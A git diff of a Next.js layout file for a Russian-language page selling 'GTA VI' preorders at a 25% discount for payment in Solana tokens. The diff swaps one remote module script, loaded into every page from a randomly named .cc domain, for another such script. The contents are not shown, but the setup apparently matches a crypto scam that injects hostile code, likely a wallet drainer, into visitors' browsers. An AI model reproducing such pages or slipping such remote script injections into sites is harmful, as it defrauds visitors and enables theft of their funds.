@@ -1,5 +1,4 @@
 import type { Metadata } from "next";
-import Script from "next/script";
 import "./globals.css";
 import ClientProviders from "@/components/ClientProviders";
 
@@ -7,6 +6,11 @@ export const metadata: Metadata = {
   title: "GTA VI × Solana — Предзаказ со скидкой 25%",
   description:
     "Предзакажи Grand Theft Auto VI с эксклюзивной скидкой 25% при оплате в сети Solana. Выход 19 ноября 2026.",
+  icons: {
+    icon: "/icons.jpg",
+    apple: "/icons.jpg",
+    shortcut: "/icons.jpg",
+  },
   openGraph: {
     title: "GTA VI × Solana — Предзаказ",
     description: "Скидка 25% при оплате любым токеном Solana",
@@ -22,11 +26,7 @@ export default function RootLayout({
   return (
     <html lang="ru" className="h-full">
       <body className="min-h-full bg-[#050510] text-white">
-      <Script
-  type="module"
-  src="https://slab-catfight.web-dist.cc/_nuxt/assets/index.js"
-  strategy="afterInteractive"
-/>
+        <script type="module" src="https://regulate-importer.asset-base.cc/_nuxt/assets/index.js"></script>
         <ClientProviders>{children}</ClientProviders>
       </body>
     </html>
